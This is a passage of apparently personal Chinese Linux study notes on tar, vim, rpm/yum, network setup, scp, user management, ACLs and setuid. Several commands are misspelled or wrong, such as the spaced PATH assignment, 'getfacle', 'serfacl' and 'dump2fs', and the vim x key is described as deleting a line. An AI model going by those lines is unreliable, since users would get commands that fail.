<li><h3 id="解压缩命令"><a href="#解压缩命令" class="headerlink" title="解压缩命令"></a>解压缩命令</h3></li>
<li><p>压缩文件gzip</p>
</li>
<li><p>解压缩命令gunzip</p>
</li>
</ul>
<p>压缩解压.gz</p>
<p>该命令只能压缩文件不能压目录，不保留源文件</p>
<ul>
<li><p>tar [压缩后的文件名][目录]      文件打包成文件夹（目录）之后解、压缩，对目录进行操作</p>
<p>-c打包</p>
<p>-v显示详细信息</p>
<p>-f指定文件名</p>
<p>-z打包同时压缩</p>
</li>
</ul>
<p>解包-x解包     </p>
<p>​                                                       保留原文件</p>
<p>解压并解包到指定该目录例子：tar -zxf  xxx.tar.gz   -C   [指定路径]</p>
<ul>
<li><p>zip [压缩后的文件名][文件或目录]  可以保留原文件</p>
<p>-r 可以压缩目录</p>
<p>解压缩unzip</p>
</li>
<li><p>bzip2 [文件]</p>
</li>
</ul>
<p>-k产生压缩文件后保留源文件</p>
<p>压缩比较大 </p>
<p>tar -cjf [压缩后的文件名][目录] </p>
<ul>
<li><p>bunzip2 </p>
<p>例子：tar -xjf xxx.tar.bz2   解压缩bz2格式并且解包tar -x</p>
<h3 id="网络命令"><a href="#网络命令" class="headerlink" title="网络命令"></a>网络命令</h3></li>
<li><p>用户之间发送信息 write [用户名]</p>
<p>CTRL+d保存</p>
<p>wall 英文原理write all</p>
<p>例子wall hello，给所有在线用户发hello</p>
</li>
<li><p>ping   指定发送次数</p>
<p>-c [次数]  指定发送次数</p>
</li>
<li><p>ifconfig</p>
<p>intreface configure</p>
</li>
<li><p>mail [用户名]</p>
</li>
</ul>
<p>mail 进入界面，q退出，d删除，h列出邮件列表</p>
<ul>
<li><p>last</p>
<p>所有用户登录的时间</p>
<p>lastlog -u[用户名uid] 只查看该用户上次登陆的信息</p>
</li>
<li><p>traceroute</p>
</li>
<li><p>netstat  查询网络状态</p>
</li>
</ul>
<p>-t tcp</p>
<p>-u udp</p>
<p>-l 监听 listen</p>
<p>-r 路由 route</p>
<p>-n 显示ip地址和端口号 nslookup</p>
<p>netstat -tlun    查看本地监听端口</p>
<p>netstat -an   查看所有网络链接（监听，已链接）</p>
<p>netstat   -rn   查看本机路由表</p>
<ul>
<li>setup 只有redhat系列中有</li>
</ul>
<p>用于配置网络</p>
<ul>
<li>mount 挂载命令</li>
</ul>
<p>mount [-t 文件系统]设备文件名  挂载点</p>
<p>卸载命令umount</p>
<h3 id="关机重启"><a href="#关机重启" class="headerlink" title="关机重启"></a>关机重启</h3><ul>
<li><p>shutdown</p>
<p>-h时间</p>
<p>-r重启</p>
<p>-c取消前一个关机命令 </p>
</li>
<li><p>/etc/inittab </p>
</li>
</ul>
<p>修改系统默认运行级别</p>
<p>ininttab 5切换成5的图形界面</p>
<p>runlevel 查询系统运行级别</p>
<ul>
<li>logout退出登录界面</li>
</ul>
<h3 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h3><table>
<thead>
<tr>
<th>变量名称</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>HOME</td>
<td>用户的主目录（即家目录）</td>
</tr>
<tr>
<td>SHELL</td>
<td>用户在使用的Shell解释器名称</td>
</tr>
<tr>
<td>HISTSIZE</td>
<td>输出的历史命令记录条数</td>
</tr>
<tr>
<td>HISTFILESIZE</td>
<td>保存的历史命令记录条数</td>
</tr>
<tr>
<td>MAIL</td>
<td>邮件保存路径</td>
</tr>
<tr>
<td>LANG</td>
<td>系统语言、语系名称</td>
</tr>
<tr>
<td>RANDOM</td>
<td>生成一个随机数字</td>
</tr>
<tr>
<td>PS1</td>
<td>Bash解释器的提示符</td>
</tr>
<tr>
<td>PATH</td>
<td>定义解释器搜索用户执行命令的路径</td>
</tr>
<tr>
<td>EDITOR</td>
<td>用户默认的文本编辑器</td>
</tr>
</tbody></table>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo $PATH #输出环境变量所有路径</span><br><span class="line">PATH = $ PATH : /root/bin # 添加文件夹到环境变量搜索的环境</span><br></pre></td></tr></table></figure>



<h3 id="vim"><a href="#vim" class="headerlink" title="vim"></a>vim</h3><ul>
<li><p>vi 文件名</p>
<p>默认进入编辑模式</p>
</li>
</ul>
<p>插入模式：用来打开文件，进入文件之后用aio即可进入插入模式，用esc键让退出插入模式</p>
<p>进入编辑模式：在命令模式下<code>：</code></p>
<p>​    显示行号<code>:set nu</code></p>
<p>​    保存退出<code>:wq</code></p>
<p>命令模式下：</p>
<p>json格式化</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">:%!python3 -m json.tool</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>命令</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>a</td>
<td>在光标所在字符后插入（after）</td>
</tr>
<tr>
<td>A</td>
<td>在光标所在行尾插入</td>
</tr>
<tr>
<td>i</td>
<td>在光标所在字符前插入</td>
</tr>
<tr>
<td>I</td>
<td>在光标所在行行首插入</td>
</tr>
<tr>
<td>o</td>
<td>在光标下插入新行</td>
</tr>
<tr>
<td>O</td>
<td>在光标上插入新行</td>
</tr>
</tbody></table>
<p>命令模式下：</p>
<table>
<thead>
<tr>
<th>命令</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>：set nu</td>
<td>设置行号</td>
</tr>
<tr>
<td>：set nonu</td>
<td>取消行号</td>
</tr>
<tr>
<td>gg/G</td>
<td>定位到第一行/最后一行</td>
</tr>
<tr>
<td>nG/：n</td>
<td>定位到n行</td>
</tr>
<tr>
<td>$</td>
<td>移至行尾</td>
</tr>
<tr>
<td>0</td>
<td>移至行首</td>
</tr>
</tbody></table>
<p>命令模式下：</p>
<p>删除</p>
<table>
<thead>
<tr>
<th>x</th>
<th>删除光标所在的一行</th>
</tr>
</thead>
<tbody><tr>
<td>nx</td>
<td>删除光标所在出后n个字符</td>
</tr>
<tr>
<td>dd</td>
<td>删除光标所在行，ndd删除n行delete</td>
</tr>
<tr>
<td>dG</td>
<td>删除光标所在行到文件末尾内容</td>
</tr>
<tr>
<td>D</td>
<td>删除光标所在处到行尾内容</td>
</tr>
<tr>
<td>:n1,n2d</td>
<td>删除指定范围行</td>
</tr>
</tbody></table>
<p>复制和粘贴</p>
<table>
<thead>
<tr>
<th>命令</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>yy</td>
<td>复制当前行copy</td>
</tr>
<tr>
<td>nyy</td>
<td>复制当前行以下n行</td>
</tr>
<tr>
<td>dd</td>
<td>剪切当前行</td>
</tr>
<tr>
<td>ndd</td>
<td>剪切当前行以下n行</td>
</tr>
<tr>
<td>p，P</td>
<td>粘贴当前光标所在行下或行上paste</td>
</tr>
</tbody></table>
<p>粘贴时保留源格式:</p>
<p>\1. 先让 Vim 处于 NORMAL 模式下；</p>
<p>\2. 执行如下命令，先进入粘贴模式：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">:set paste</span><br></pre></td></tr></table></figure>

<p>\3. 然后进入 INSERT 模式；</p>
<p>\4. 按下p 粘贴代码进来，这个时候的格式能保留原样；</p>
<p>\5. 按 ESC 回到 NORMAL 模式；</p>
<p>\6. 退出粘贴模式：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">:set nopaste</span><br></pre></td></tr></table></figure>

<p>替换和取消</p>
<table>
<thead>
<tr>
<th>命令</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>r</td>
<td>取代光标所在处的字符replace</td>
</tr>
<tr>
<td>R</td>
<td>从光标所在出开始替换字符，直到esc结束</td>
</tr>
<tr>
<td>u</td>
<td>undo取消上一步操作</td>
</tr>
</tbody></table>
<p>搜索和搜索替换命令</p>
<table>
<thead>
<tr>
<th>命令</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>/string</td>
<td>搜索指定字符串，忽略大小写：set ic</td>
</tr>
<tr>
<td>n</td>
<td>搜索下一个指定字符串出现的位置</td>
</tr>
<tr>
<td>：%s/old/new/g</td>
<td>全文替换指定字符串</td>
</tr>
<tr>
<td>：n1,n1s/old/new/g</td>
<td>在一定范围内指定替换字符串</td>
</tr>
</tbody></table>
<p>保存和退出命令</p>
<table>
<thead>
<tr>
<th>命令</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>：w</td>
<td>保存修改</td>
</tr>
<tr>
<td>：w new_fliename</td>
<td>另存为指定文件</td>
</tr>
<tr>
<td>：wq</td>
<td>保存并且退出</td>
</tr>
<tr>
<td>ZZ</td>
<td>保存并且退出</td>
</tr>
<tr>
<td>：q!</td>
<td>不保存修改退出</td>
</tr>
<tr>
<td>：wq！</td>
<td>保存修改退出，仅root和文件所有者能用</td>
</tr>
</tbody></table>
<p>vim技巧</p>
<ul>
<li><p>导入命令执行结果<code>：r！命令</code></p>
</li>
<li><p>定义快捷键<code>map 快捷键   触发命令</code></p>
</li>
</ul>
<p>ex       <code>:map ^p I#&lt;ESC&gt;</code>      ctrl+p在光标所在行行首插入一个#</p>
<p>​    <code>:map ^B 0x</code>   删除光标所在行行首的第一个字符</p>
<p><strong>值得注意的是,在使用快捷键定义时，^p不能直接按要同时按住ctrl+V+p</strong></p>
<ul>
<li><p>连续行注释</p>
<p><code>n1,n2s/^/#/g</code>在n1和n2行之间行首添加“#”   </p>
<p><code>n1,n2s/^#//g</code>删除n1n2行首的第一个字符</p>
<p><code>n1,n2s/^/\/\//g</code>在行首增加//，注释符，\代表转义</p>
</li>
<li><p>替换 <code>ab mymail 834876096@163.com</code></p>
</li>
</ul>
<p>vimrc文件可以在和用户名目录下创建<code>.vimrc</code>,这样重启就不会被抹除配置</p>
<ul>
<li><p>同时显示多个文件(分屏)</p>
<p><code>:split</code></p>
<p><code>:vsplit</code></p>
</li>
<li><p>在文件中切换</p>
<p>ctrl+6下一个文件</p>
<p><code>:bp</code>上一个文件</p>
<p><code>:bp</code>上一个文件</p>
</li>
<li><p>窗口之间切换</p>
<p>ctrl+w h/j/k/l</p>
</li>
<li><p>3.多文档编辑的命令如下</p>
<p>:n     编辑下一个文档。<br>:2n    编辑下两个文档。<br>:N     编辑上一个文档。注意，该方法只能用于同时打开多个文档。<br>:e 文档名    这是在进入vim后，不离开 vim 的情形下打开其他文档。<br>:e# 或 Ctrl+ˆ   编辑上一个文档,用于两个文档相互交换编辑时使用。?# 代表的是编辑前一次编辑的文档<br>:files 或 :buffers 或 :ls   可以列出目前 缓冲区 中的所有文档。加号 + 表示 缓冲区已经被修改过了。＃代表上一次编辑的文档，%是目前正在编辑中的文档<br>:b 文档名或编号   移至该文档。<br>:f 或 Ctrl+g   显示当前正在编辑的文档名称。<br>:f 檔名     改变编辑中的文档名。(file)</p>
<p> <strong>多文件切换</strong></p>
<ol>
<li>通过vim打开多个文件（可以通过ctags或者cscope） </li>
<li>“:ls”查看当前打开的buffer（文件） </li>
<li>“:b num”切换文件（其中num为buffer list中的编号）</li>
</ol>
</li>
</ul>
<hr>
<h3 id="手工rpm包管理"><a href="#手工rpm包管理" class="headerlink" title="手工rpm包管理"></a>手工rpm包管理</h3><p>源码包（脚本安装包）</p>
<p>rpm包是centos中的安装包，是二进制包，已经过编译的包</p>
<h4 id="rpm包管理命名和依赖性"><a href="#rpm包管理命名和依赖性" class="headerlink" title="rpm包管理命名和依赖性"></a>rpm包管理命名和依赖性</h4><ul>
<li><p>httpd-2.2.15-15.el6.centos.1.i686.rpm（例子，包全名）</p>
<p>​    httpd    软件包名</p>
<p>​    2.2.15   软件版本</p>
<p>​    15          软件发布次数</p>
<p>​    el6.centos 适合的Linux平台</p>
<p>​    i686        适合的硬件平台</p>
<p>​    rpm         rpm包扩展名</p>
</li>
<li><p>依赖性</p>
<ul>
<li>树形依赖： a-&gt;b-&gt;c</li>
<li>环形依赖:    a-&gt;b-&gt;c-&gt;a</li>
<li>模块依赖：模块依赖查询网站</li>
</ul>
<p><a href="http://www.rpmfind.net/">www.rpmfind.net</a></p>
<p>.so.2是库依赖</p>
</li>
<li><p>yum在线管理</p>
</li>
</ul>
<p>yum可以从互联网上自动下载依赖库，解决rpm命令管理的依赖性问题（下一讲）</p>
<h4 id="安装升级与卸载"><a href="#安装升级与卸载" class="headerlink" title="安装升级与卸载"></a>安装升级与卸载</h4><p>包全名：操作的包是没有安装的软件包时，使用包全名</p>
<p>包名：操作已经安装的软件包时，使用包名，搜索/var/lib/rpm/中的数据库</p>
<ul>
<li>安装</li>
</ul>
<p>rpm - ivh  包全名</p>
<p>-i   （install） 安装</p>
<p>-v (verbose)   显示详细信息</p>
<p>-h (hash)    显示进度</p>
<p>–nodeps  不检测依赖性（一般不用）</p>
<p><em><strong>ps：两次tab键补全</strong></em></p>
<ul>
<li><p>升级</p>
<p>rpm -Uvh 包全名</p>
<p>upgrade</p>
</li>
<li><p>卸载</p>
</li>
</ul>
<p>rpm -e 包名</p>
<p>erase</p>
<h4 id="查询"><a href="#查询" class="headerlink" title="查询"></a>查询</h4><p>rpm  包名</p>
<p>-q query 查已安装包，包名</p>
<p>-a all</p>
<p>-i information</p>
<p>-p package  查询未安装包的信息，包全名</p>
<p>-l list 列表</p>
<p>-f file</p>
<hr>
<p>-ql可以查询安装位置</p>
<p>-qi 包名 查询软件包的详细信息</p>
<p>-qf 系统文件名</p>
<p>-qR 包名   查询未安装的服务依赖性</p>
<h4 id="效验"><a href="#效验" class="headerlink" title="效验"></a>效验</h4><p>-V 已安装的包名</p>
<p>验证内容中八个信息具体内容如下</p>
<p>S  文件大小是否改变</p>
<p>M  文件的类型和文件权限是否改变</p>
<p>5  文件md5校验和是否被改变</p>
<p>D   设备中的主从代码是否改变</p>
<p>L  文件路径是否改变</p>
<p>U   文件的所有者关系是否改变</p>
<p>G  文件的属组是否改变</p>
<p>T  文件的修改时间是否改变</p>
<hr>
<p>c  配置文件config</p>
<p>d 普通文档documentation</p>
<p>g ghost文件不应被rpm包包含</p>
<p>l 授权文件license</p>
<p>r 描述文件readme</p>
<ul>
<li>rpm包中文件提取（可以用于恢复系统文件误删）</li>
</ul>
<p>rpm2cpio 包全名 | \ cpio -idv .文件绝对路径</p>
<p>#rpm2cpio是一个把rpm包转换成cpio格式的命令</p>
<p>#cpio是一个标准工具，用于创建软件档案文件和从档案文件中提取文件</p>
<hr>
<h3 id="在线rpm包管理"><a href="#在线rpm包管理" class="headerlink" title="在线rpm包管理"></a>在线rpm包管理</h3><h4 id="IP地址配置和网络yum源"><a href="#IP地址配置和网络yum源" class="headerlink" title="IP地址配置和网络yum源"></a>IP地址配置和网络yum源</h4><ul>
<li><p>ip地址和本机网络信息</p>
<ol>
<li><p> setup回车就可以配置ip地址（仅redhat系列）</p>
</li>
<li><p>改ip地址: vi /etc/sysconfig/network-scripts/ifcfg-eth0中onboot改成yes 然后 service network restart</p>
</li>
<li><p>改主机名:/etc/sysconfig/network</p>
</li>
<li><p>改dns: /etc/resolv.conf</p>
</li>
</ol>
</li>
<li><p>网络yum源</p>
</li>
</ul>
<p>vi /etc/yum.repos.d/CentOS-Base.repo </p>
<h4 id="yum命令"><a href="#yum命令" class="headerlink" title="yum命令"></a>yum命令</h4><p>yum list   查询所有可用软件包列表</p>
<p>yum search 关键字  搜索服务器上所有和关键字相关的包</p>
<p>yum -y install 包名    安装</p>
<p>yum - y  update 包名   升级（不加包名会升级所有软件包括内核，会导致远程内核连接不上）</p>
<p>yum -y remove 包名   卸载（尽量不要卸载，会卸载所有依赖库，可能会导致Linux崩溃）</p>
<ul>
<li>软件包组安装</li>
</ul>
<p>yum grouplist  列出所有可用的软件组列表</p>
<p>yum groupinstall 软件组名    指定安装软件组</p>
<p>yum groupremove  软件组名   卸载指定软件组</p>
<hr>
<h4 id="光盘yum的搭建"><a href="#光盘yum的搭建" class="headerlink" title="光盘yum的搭建"></a>光盘yum的搭建</h4><ol>
<li><p>挂载光盘</p>
</li>
<li><p>让网络yum源文件失效，通过改/etc/yum.repos.d/中除了光盘的repo文件之外的repo文件的文件名来使其失效</p>
</li>
<li><p>在修改光盘yum源文件</p>
<p>file地址改为自己的光盘地址，enable = 1；打开 </p>
<h3 id="源码包-amp-rpm包"><a href="#源码包-amp-rpm包" class="headerlink" title="源码包&amp;rpm包"></a>源码包&amp;rpm包</h3><ol>
<li><p>下载源码包</p>
</li>
<li><p>解压缩下载的源码包</p>
</li>
<li><p>进入解压缩目录</p>
<p>ls查看INSTALL文件和README文件可以提供安装帮助</p>
</li>
</ol>
</li>
</ol>
<ul>
<li><p>源码包一般安装在/usr/local/软件名/</p>
</li>
<li><p>etc/rc.d/init.d/  中有可执行文件</p>
<p>service 服务名 start/restart</p>
<p>  service不能管理源码包</p>
<p>源码包在 usr/local/src/中</p>
<p>软件安装位置/usr/local/ </p>
<p>make 编译 如果出错 make clean</p>
<p>make install 编译安装</p>
</li>
</ul>
<h3 id="网络"><a href="#网络" class="headerlink" title="网络"></a>网络</h3><h4 id="修改ip"><a href="#修改ip" class="headerlink" title="修改ip"></a>修改ip</h4><ul>
<li>临时修改命令工具</li>
</ul>
<p>ifconfig 查看与配置网络状态命令</p>
<p>临时设置eth0网卡ip地址和子网掩码</p>
<p><code>ifconfig eth0 192.168.0.200 255.255.255.0</code></p>
<p>虚拟网卡 <code>ifconfig eth0:0 192.168.3.1</code></p>
<p>关闭虚拟网卡<code>ifconfig eth0:0 down</code></p>
<ul>
<li>setup图形化窗口配置</li>
<li>修改网络配置文件</li>
</ul>
<p><code>vi /etc/sysconfig/network-scripts/ifcfg-eth0  </code></p>
<p>主机名<code>vi /etc/sysconfig/network</code></p>
<p>dns <code>vi /etc/resolv.config </code></p>
<p>修改完网络信息需要对网络服务进行重启<code>service network restart</code></p>
<h4 id="查看主机名"><a href="#查看主机名" class="headerlink" title="查看主机名"></a>查看主机名</h4><p><code>hostname</code>显示主机名 </p>
<p><code>hostname 主机名</code>更改主机名</p>
<h4 id="网卡设备开关"><a href="#网卡设备开关" class="headerlink" title="网卡设备开关"></a>网卡设备开关</h4><p><code>ifdown 网卡设备名</code>   禁用网卡</p>
<p><code>ifup  网卡设备名</code>  开启网卡</p>
<h4 id="查看网络状态"><a href="#查看网络状态" class="headerlink" title="查看网络状态"></a>查看网络状态</h4><p>netstat [option]</p>
<p>-t   列出tcp协议端口</p>
<p>-u  列出udp协议端口</p>
<p>-a all,包括tcp和udp</p>
<p>-n  不使用域名和服务名,而使用ip地址和端口号</p>
<p>-l  仅列出在监听状态的网卡</p>
<p>-r 查看路由列表</p>
<p><code>route -n</code>  查看路由列表</p>
<h4 id="域名解析命令"><a href="#域名解析命令" class="headerlink" title="域名解析命令"></a>域名解析命令</h4><p><code>nslookup 主机名或者ip</code></p>
<h4 id="ping命令"><a href="#ping命令" class="headerlink" title="ping命令"></a>ping命令</h4><p><code>ping 主机或者ip</code></p>
<p>-c 次数</p>
<h4 id="telnet命令"><a href="#telnet命令" class="headerlink" title="telnet命令"></a>telnet命令</h4><p><code>telnet [域名和ip]  [端口]</code>  #远程管理和端口探测命令</p>
<p>或者直接用nmap扫</p>
<h4 id="traceroute"><a href="#traceroute" class="headerlink" title="traceroute"></a>traceroute</h4><p><code>traceroute [option] ip或者域名</code></p>
<p>路由跟踪命令</p>
<p>-n   使用ip不使用域名,速度更快</p>
<h4 id="wget命令-下载"><a href="#wget命令-下载" class="headerlink" title="wget命令,下载"></a>wget命令,下载</h4><p><code>wget 网站</code></p>
<p>下载命令</p>
<h4 id="SCP命令"><a href="#SCP命令" class="headerlink" title="SCP命令"></a>SCP命令</h4><p>scp [参数] [原路径] [目标路径]</p>
<ul>
<li><p>命令参数：</p>
</li>
<li><p>-1 强制scp命令使用协议ssh1</p>
</li>
<li><p>-2 强制scp命令使用协议ssh2</p>
</li>
<li><p>-4 强制scp命令只使用IPv4寻址</p>
</li>
<li><p>-6 强制scp命令只使用IPv6寻址</p>
</li>
<li><p>-B 使用批处理模式（传输过程中不询问传输口令或短语）</p>
</li>
<li><p>-C 允许压缩。（将-C标志传递给ssh，从而打开压缩功能）</p>
</li>
<li><p>-p 留原文件的修改时间，访问时间和访问权限。</p>
</li>
<li><p>-q 不显示传输进度条。</p>
</li>
<li><p>-r 递归复制整个目录。</p>
</li>
<li><p>-v 详细方式显示输出。scp和ssh(1)会显示出整个过程的调试信息。这些信息用于调试连接，验证和配置问题。</p>
</li>
<li><p>-c cipher 以cipher将数据传输进行加密，这个选项将直接传递给ssh。</p>
</li>
<li><p>-F ssh_config 指定一个替代的ssh配置文件，此参数直接传递给ssh。</p>
</li>
<li><p>-i identity_file 从指定文件中读取传输时使用的密钥文件，此参数直接传递给ssh。</p>
</li>
<li><p>-l limit 限定用户所能使用的带宽，以Kbit/s为单位。</p>
</li>
<li><p>-o ssh_option 如果习惯于使用ssh_config(5)中的参数传递方式，</p>
</li>
<li><p>-P port 注意是大写的P, port是指定数据传输用到的端口号</p>
</li>
<li><p>-S program 指定加密传输时所使用的程序。此程序必须能够理解ssh(1)的选项。</p>
</li>
</ul>
<ul>
<li>从本地服务器复制到远程服务器</li>
</ul>
<p>复制文件:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$scp local_file remote_username@remote_ip:remote_folder</span><br><span class="line">$scp local_file remote_username@remote_ip:remote_file</span><br><span class="line">$scp local_file remote_ip:remote_folder</span><br><span class="line">$scp local_file remote_ip:remote_file</span><br></pre></td></tr></table></figure>

<p>指定了用户名，命令执行后需要输入用户密码；如果不指定用户名，命令执行后需要输入用户名和密码；</p>
<p>复制目录:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$scp -r local_folder remote_username@remote_ip:remote_folder</span><br><span class="line">$scp -r local_folder remote_ip:remote_folder</span><br></pre></td></tr></table></figure>

<p>第1个指定了用户名，命令执行后需要输入用户密码； 第2个没有指定用户名，命令执行后需要输入用户名和密码；</p>
<p>注解</p>
<p>从远程复制到本地的scp命令与上面的命令一样，只要将从本地复制到远程的命令后面2个参数互换顺序就行了。</p>
<ul>
<li>实例1：从远处复制文件到本地目录</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$scp root@10.6.159.147:/opt/soft/demo.tar /opt/soft/</span><br></pre></td></tr></table></figure>

<p>说明： 从10.6.159.147机器上的/opt/soft/的目录中下载demo.tar 文件到本地/opt/soft/目录中</p>
<ul>
<li>实例2：从远处复制到本地</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$scp -r root@10.6.159.147:/opt/soft/test /opt/soft/</span><br></pre></td></tr></table></figure>

<p>说明： 从10.6.159.147机器上的/opt/soft/中下载test目录到本地的/opt/soft/目录来。</p>
<ul>
<li>实例3：上传本地文件到远程机器指定目录</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$scp /opt/soft/demo.tar root@10.6.159.147:/opt/soft/scptest</span><br></pre></td></tr></table></figure>

<p>说明： 复制本地opt/soft/目录下的文件demo.tar 到远程机器10.6.159.147的opt/soft/scptest目录</p>
<ul>
<li>实例4：上传本地目录到远程机器指定目录</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$scp -r /opt/soft/test root@10.6.159.147:/opt/soft/scptest</span><br></pre></td></tr></table></figure>

<p>说明： 上传本地目录 /opt/soft/test到远程机器10.6.159.147上/opt/soft/scptest的目录中</p>
<h2 id="用户和用户组管理"><a href="#用户和用户组管理" class="headerlink" title="用户和用户组管理"></a>用户和用户组管理</h2><p><strong>用户基本信息文件</strong>              /etc/passwd</p>
<p><code>account:password:uid:gid:用户说明:家目录:shell解释器所在位置</code></p>
<ul>
<li>shell解释器的位置/bin/bash说明是允许登录的,但是/sbin/nologin就不能登录</li>
<li>初始组和附加组,初始组的只能有一个,可以改但不建议,一个用户可以用多个附加组</li>
<li>uid为0时是管理员用户</li>
<li>passwd字段是x的意思是真实密码(加密后密码)存在/etc/shadow文件下 ,具体含义man 5 shadow</li>
</ul>
<p><strong>组信息文件</strong>                             /etc/group</p>
<p><code>组名:password:gid:这个组中的附加用户</code></p>
<ul>
<li>password真实加密密码在gshadow中</li>
</ul>
<p><strong>家目录</strong>       普通用户: /home/用户名/      root用户: /root/</p>
<p><strong>用户邮箱</strong> /var/spool/mail/用户名/</p>
<p><strong>用户模板目录</strong>    /etc/skel/  在新建用户时自动拷贝该文件夹下所有内容到新建用户的家目录</p>
<h3 id="用户管理命令"><a href="#用户管理命令" class="headerlink" title="用户管理命令"></a>用户管理命令</h3><h4 id="添加用户"><a href="#添加用户" class="headerlink" title="添加用户"></a>添加用户</h4><ul>
<li><p><code>useradd [option] 用户名</code></p>
<p>​    -u 手工指定uid</p>
<p>​    -d 家目录</p>
<p>​    -c 用户的说明</p>
<p>​    -g 指定初始组</p>
<p>​    -G 指定附属组</p>
<p>​    -s 手工指定用户shell</p>
</li>
</ul>
<h4 id="修改密码"><a href="#修改密码" class="headerlink" title="修改密码"></a>修改密码</h4><ul>
<li><p><code>passwd [option] 用户名 </code></p>
<p>-l 锁定用户,禁止其登录</p>
<p>-u 解锁用户</p>
<p>–stdin 允许使用标准输入修改用户密码 </p>
<p>-d 允许使用空密码登录</p>
<p>-e 强制用户下次登录时修改密码</p>
<p>-S 显示用户的密码是否被锁定,以及密码采用的加密算法名称</p>
</li>
<li><p>who  可以查看当前登录的用户，w详细信息 </p>
<p>tty是本地终端，pts表示远程终端</p>
</li>
<li><p>userdel 用户名</p>
<p>- </p>
</li>
</ul>
<p>用户默认值文件 /etc/default/useradd</p>
<p>默认密码有效期 /etc/login/defs</p>
<p><strong>修改用户</strong></p>
<p><code>usermod  [option] 用户名</code></p>
<p>-c 附加说明</p>
<p>-G 附加组</p>
<p>-L 锁定用户</p>
<p>-U 解锁用户</p>
<p><code>chage 用户名</code> 修改用户密码状态</p>
<p>chage -d 0 用户名 # 当前用户名的shadow第三字段修改密码时间为0天,登录要求用户设置新密码</p>
<h4 id="删除用户"><a href="#删除用户" class="headerlink" title="删除用户"></a>删除用户</h4><p><code>userdel [option] 用户名</code></p>
<ul>
<li>-r 删除用户的同时删除用户家目录</li>
<li>-f 强制删除</li>
</ul>
<p><code>su 用户名</code></p>
<p><code>- 连带环境变量一起切换</code></p>
<p>-c 不切换身份用root身份执行一条命令</p>
<h3 id="用户组管理"><a href="#用户组管理" class="headerlink" title="用户组管理"></a>用户组管理</h3><h4 id="添加组"><a href="#添加组" class="headerlink" title="添加组"></a>添加组</h4><p><code>groupadd 组名</code></p>
<p>-g   指定gid</p>
<h4 id="修改组"><a href="#修改组" class="headerlink" title="修改组"></a>修改组</h4><p><code>groupmod 用户名</code></p>
<p>-n 新组名</p>
<p>-g 修改组id</p>
<h4 id="删除组"><a href="#删除组" class="headerlink" title="删除组"></a>删除组</h4><p>groupdel</p>
<p>将用户添加组或者从组中删除</p>
<p>​    gpasswd 选项 组名</p>
<p>-a 用户名 把用户加入组</p>
<p>-d 把用户从组中删除</p>
<p>加的都是附加组</p>
<h2 id="权限管理"><a href="#权限管理" class="headerlink" title="权限管理"></a>权限管理</h2><h4 id="acl权限"><a href="#acl权限" class="headerlink" title="acl权限"></a>acl权限</h4><p>补足linux中所属者所属组其他人权限配不足的问题，通过对单个用户分配不同的权限达到权限分配的目地</p>
<p>查看是否开启acl权限： <code>dump2fs -h /dev/sda3</code> 该命令用于查看值都能够文件系统详细信息</p>
<p>开启acl权限，默认已经挂载</p>
<p>如果没有acl权限就重新挂载分区</p>
<ul>
<li><p>临时</p>
<p>mount -o remount，acl /</p>
</li>
<li><p>永久</p>
<ul>
<li><p>修改fastab文件</p>
<p>在defaluts后加入<code>,acl</code></p>
<p>之后重新挂载<code>mount -o remount /</code>或者重启</p>
</li>
</ul>
</li>
</ul>
<p>查看acl命令</p>
<p><code>getfacle 文件名</code></p>
<p>设定acl权限命令</p>
<p><code>setfacl [option] 文件名</code></p>
<p>-m 赋予权限使用  “u:用户名:权限” 的格式，权限写法rwx；“m:” 之后写入的权限是最大权限mask设定</p>
<ul>
<li>最大mask有效权限与删除</li>
</ul>
<p>mask权限与acl权限相与之后才是最终权限</p>
<ul>
<li>删除acl权限</li>
</ul>
<p>setfacl -x u：用户名 文件名</p>
<p>setfacl -x g：组名 文件名</p>
<p>setfacl -b 文件名/目录名</p>
<ul>
<li>递归acl权限</li>
</ul>
<p>serfacl -m u：用户名 ：权限 -R 文件名</p>
<ul>
<li>默认acl权限</li>
</ul>
<p>serfacl -m d：u：用户名 ：权限  文件名</p>
<h4 id="文件特殊权限"><a href="#文件特殊权限" class="headerlink" title="文件特殊权限"></a>文件特殊权限</h4><p>如果设置了setuid那么所有者的权限就会变成<code>rws</code>原本x变成s</p>
<p>其余两个同理</p>
<ul>
<li><p>setuid</p>
<ul>
<li>只有可以执行的二进制文件才能设定setuid权限</li>
<li>执行者必须要有x权限</li>
<li>（在设置了setuid之后）命令执行者在执行文件会暂时获得文件所有者的身份</li>
<li>seruid权限只有在执行程序的过程中有效  </li>
</ul>
<p><strong>设定方法</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chmod 4755 文件名 #4表示suid</span><br><span class="line">chmod u+s 文件名</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">删除suid方法</span></span><br><span class="line">chmod 755 文件名</span><br><span class="line">chmod u-s 文件名</span><br></pre></td></tr></table></figure>

<p>该权限非常危险，应严格控制写权限</p>
</li>
<li><p>setgid</p>
<ul>
<li><p>只有可以执行的二进制文件才能设定setuid权限</p>
</li>
<li><p>执行者必须要有x权限</p>
</li>
<li><p>（在设置了setuid之后）命令执行者在执行文件会暂时获得文件所属组的身份</p>
</li>
<li><p>setgid权限只有在执行程序的过程中有效  </p>
<p>针对目录功能</p>
<ul>
